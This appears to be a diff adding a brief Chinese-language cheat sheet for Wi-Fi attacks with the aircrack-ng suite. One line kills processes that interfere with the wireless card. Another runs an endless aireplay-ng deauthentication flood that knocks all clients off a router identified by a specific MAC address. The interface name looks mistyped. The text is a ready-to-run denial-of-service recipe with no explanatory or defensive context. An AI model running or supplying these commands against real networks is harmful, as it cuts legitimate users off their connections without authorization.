@@ -1,0 +1,7 @@
+K掉影响网卡的进程
+	airmon-ng check kill
+	
+让当前路由下的所有连接断开
+	aireplay-ng -0 0 -a 28:6C:07:53:53:80 wlam0mon
+	
+
